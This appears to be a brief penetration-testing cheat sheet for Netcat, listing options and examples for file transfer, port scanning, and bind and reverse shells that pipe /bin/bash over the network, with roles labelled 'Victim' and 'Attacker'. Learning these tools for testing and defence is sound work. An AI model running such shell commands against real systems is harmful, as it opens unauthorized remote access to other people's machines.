# Netcat

## Common Options

* \-n : skip DNS resolution
* \-v : increase verbosity
* \-l : listener mode
* \-p \<port> : listener port
* \-e \<bin> : binary to pipe
* \-u : UDP mode
* \-w \<seconds> : connection timeout
* \-z : zero I/O mode

## Usage

### Simple server / client

```
$ nc -nlvp 8080
$ nc -nv 127.0.0.1 8080
```

### File transfer

```
# Client --> Server
$ nc -nlvp 8080 > incoming.txt
$ nc -nv 127.0.0.1 8080 < file.txt
```

### Shells

#### Bind Shell

```
# Victim
$ nc -nlvp 8080 -e /bin/bash

# Attacker
$ nc -nv 127.0.0.1 8080
```

#### Reverse Shell

```
# Attacker
$ nc -nlvp 8080

# Victim
$ nc -nv 127.0.0.1 8080 -e /bin/bash
```

### Port Scanning

```
$ nc -nvv -w 1 -z 127.0.0.1 3388-3390
```
